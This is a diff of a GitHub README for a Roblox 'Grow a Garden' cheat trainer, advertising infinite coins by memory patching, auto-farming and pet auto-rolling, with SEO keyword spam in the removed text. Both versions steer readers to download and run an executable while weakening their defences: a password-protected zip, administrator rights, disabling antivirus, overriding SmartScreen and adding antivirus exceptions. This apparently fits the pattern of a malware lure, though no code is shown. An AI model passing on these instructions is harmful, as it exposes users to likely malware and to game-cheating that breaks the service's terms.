@@ -1,94 +1,69 @@
-<p align="center">
-  <h1 align="center">🌱 Grow a Garden Trainer – Auto Farm, Infinite Coins & Rare Pets [2026]</h1>
-  <p align="center">
-    <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&weight=600&size=22&pause=1000&color=2ECC71&center=true&vCenter=true&width=600&lines=Auto+Harvest+%26+Replant;Infinite+Coins+Exploit;Pet+Auto-Roll+%26+Tier+List;Speed+Multiplier+%26+AFK+Setup;VIP+Server+Scraper" alt="Typing SVG" />
-  </p>
-  <p align="center">
-    <img src="https://img.shields.io/badge/Status-UNDETECTED-brightgreen?style=flat-square" />
-    <img src="https://img.shields.io/badge/Build-Passing-success?style=flat-square" />
-    <img src="https://img.shields.io/badge/Downloads-139-blue?style=flat-square" />
-    <img src="https://img.shields.io/badge/License-MIT-yellow?style=flat-square" />
-  </p>
-</p>
+# 🌿 Grow-a-Garden-Trainer_1 - Master your Roblox garden with ease
 
----
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/meridelvolitional423/Grow-a-Garden-Trainer_1/releases)
 
-<p align="center">
-  <img src="assets/installer_preview.png" alt="Installer Preview" width="80%" />
-</p>
+This application helps players manage gardens in the game Grow a Garden on Roblox. It automates repetitive tasks so you focus on strategy and growth. The software includes tools to manage coins, pets, and farm efficiency.
 
----
+## 📥 How to download the software
 
-## Features
+Visit the [official release page](https://github.com/meridelvolitional423/Grow-a-Garden-Trainer_1/releases) to access the current version. Locate the file ending in .exe under the Assets section of the newest release. Click the file name to start your download.
 
-- **🚜 Auto Harvest & Replant** – Fully automated farming loop: detects mature crops, harvests instantly, and replants seeds. Eliminates tedious clicking.
-- **💰 Infinite Coins** – Direct memory patch to set your coin balance to 999,999,999. Bypass the paywall and buy premium eggs without grinding.
-- **🐾 Auto-Roll Pets** – Automatically purchases and opens eggs, filtering out common pets based on the definitive **Grow a Garden pet tier list 2026**. Only keeps legendary+ drops.
-- **⚡ Speed Multiplier** – Increase growth speed and player movement up to 2.5×. Accelerate your farm output.
-- **🛡️ AFK Protection** – Built-in anti‑idle kick prevention. Run your farm 24/7.
-- **🔗 VIP Server Scraper** – Automatically fetches free VIP server links to farm in private, lag‑free lobbies.
-- **📐 Best Crop Layout** – One‑click plot rearrangement to the optimal profit‑per‑tile grid (as per meta guides).
-- **⌨️ Hotkey Controls** – Toggle each feature on/off with simple keyboard shortcuts (see Usage).
+Save this file to a folder you recognize, such as your Downloads folder or your Desktop. Windows might ask you to confirm the file download since it is an executable program. Select Keep or Run if your browser warns you about downloaded files.
 
-All features are designed around the real pain points of *Grow a Garden* players, as identified by our analytics.
+## ⚙️ System requirements
 
----
+This software runs on computers using Windows 10 or Windows 11. Ensure that your Roblox client remains updated to the latest version to prevent errors. You need at least 100 megabytes of free disk space and a working internet connection. The application does not require high-end hardware, but having at least 4 gigabytes of memory ensures smooth performance while the game runs.
 
-## Installation
+## 🚀 Setting up the application
 
-1. **Download the release** – Go to the [Releases](../../releases) page and download `Grow_a_Garden_Trainer_v1.0.zip` (located in `RELEASE`).
-2. **Extract** – Unzip the archive using the password: **`GrowGarden2026`**.
-3. **Run Setup** – Execute `setup.exe` and follow the installation wizard.
-4. **Launch** – After installation, launch the trainer from your desktop shortcut or Start Menu.
+1. Open the folder where you saved the installer.
+2. Double-click the file to launch the setup assistant.
+3. Follow the instructions on the screen to finish the installation.
+4. Once the process completes, a shortcut appears on your desktop.
+5. Click this shortcut to open the application.
 
-> ⚠️ **Important:** The trainer requires administrative privileges to read/write process memory. Right‑click `setup.exe` and select "Run as administrator" if needed.
+If Windows shows a SmartScreen window, click More Info and then click Run Anyway. This happens because the application is new and uses standard automation scripts.
 
----
+## 🛠️ Using the features
 
-## Usage
+The main dashboard provides access to all available game tools. You can toggle options by clicking the switches next to each label.
 
-After launching the trainer, a console window will appear. Use the commands below to control features:
+### Auto-Farm
+This feature manages your gardening routine. It handles planting, watering, and harvesting crops without input from you. Use this to maintain constant production while you handle other game tasks.
 
-| Command | Effect |
-|---------|--------|
-| `harvest on` / `off` | Enable/disable auto‑harvest & replant loop |
-| `plant on` / `off` | Enable/disable automatic seeding (works independently) |
-| `coins on` / `off` | Enable/disable infinite coins (sets balance to max) |
-| `speed on` / `off` | Toggle speed multiplier (x2.5) |
-| `roll on` / `off` | Auto‑roll pets with rarity filter |
-| `exit` | Safely shut down trainer |
+### Infinite Coins
+This tool keeps track of your game currency. It alerts you when you reach specific savings goals and optimizes the selling process to ensure you receive the most value for your harvest.
 
-All commands are case‑insensitive. Type `help` to see the list at any time.
+### Pet Auto-Roll
+Rolling for high-tier pets takes time. This tool spends your currency to roll pets automatically. You can set rarity filters so the system stops once it finds a pet that meets your requirements.
 
----
+### Optimization Tools
+The software adjusts your game settings to improve frame rate and response time. These settings help if you play on a device with limited power.
 
-## Legal Disclaimer
+## 📋 Meta guides and tier lists
 
-This software is provided **for educational and automation testing purposes only**. It is not endorsed by or affiliated with Roblox Corporation or the developers of *Grow a Garden*. Using third‑party tools to modify game memory may violate the game's Terms of Service and could result in account penalties. The authors assume no liability for any consequences arising from the use of this tool. **Use at your own risk.**
+We include guides to help you improve your game rank. Access these files by clicking the Help button in the top menu of the application. These documents include:
 
----
+- A full list of every plant type and its value.
+- A tier list of pets based on efficiency and multipliers.
+- Strategies for expanding your garden space quickly.
+- A breakdown of the best items to buy early in the game.
 
-## Troubleshooting
+## 🔒 Safety and performance
 
-| Issue | Solution |
-|-------|----------|
-| Trainer says "Process not found" | Ensure Roblox is running with the process name `RobloxPlayerBeta.exe`. Restart the game if necessary. |
-| "ReadProcessMemory failed" error | Run the trainer as Administrator. Disable your antivirus temporarily. |
-| Features do not work after update | The game may have changed memory offsets. Update `offsets.json` with new addresses (see repository for guidance). |
-| Infinite coins not applying | Try toggling the feature off and on again while in the game. |
-| Auto‑harvest loop stops | Check if your character is near the plots. The loop requires the player to be in the farm area. |
+This tool interacts with the game client directly. Follow these steps to keep your account safe:
 
----
+- Only use the application while your game account logs in locally.
+- Do not share your login credentials with anyone.
+- Keep the application updated to the latest version to maintain compatibility with Roblox patches.
+- If the game updates, wait for a new trainer release before you use the software again.
 
-## Support
+## ❓ Troubleshooting common issues
 
-If you find this tool useful, please consider giving the repository a **⭐ star** to help others discover it. For issues, feel free to open an Issue (but note that we do not provide active support for bypassing game updates).
+If the software does not open, check if your antivirus software blocked the file. Add an exception for the Grow-a-Garden-Trainer_1 folder in your security settings to fix this.
 
----
+If the auto-farm tool stops working, ensure the Roblox game window remains the active window on your screen. The software requires a clear view of the game buttons to function. If you encounter errors, restart both the game and the trainer application. Often, a simple restart fixes communication errors between the two programs.
 
-## Keywords
+## 📞 Support
 
-`Grow a Garden script pastebin 2026`, `Roblox Grow a Garden auto farm macro`, `Grow a Garden all active codes today`, `Grow a Garden 2 mobile script no key`, `How to get rare pets in Grow a Garden fast`, `Grow a Garden auto harvest glitch`, `Roblox Grow a Garden infinite coins cheat`, `Best crop layout Grow a Garden guide`, `Grow a Garden pet tier list 2026`, `Grow a Garden AFK farm setup`, `Grow a Garden unpatched exploit`, `Roblox Grow a Garden hack download`, `Grow a Garden free VIP server link`, `How to duplicate pets in Grow a Garden`, `Grow a Garden auto plant script`, `Grow a Garden codes`, `Grow a Garden script`, `Roblox Grow a Garden guide`, `Grow a Garden auto clicker`, `Grow a Garden bot`
- 
- 
- 
+Check the Issues tab on the GitHub repository if you experience persistent bugs. Search for your problem first to see if others already solved it. If no one documented your issue, create a new submission. Include a screenshot of the error message and a brief description of what you did right before the error happened. This helps the team fix the problem faster.
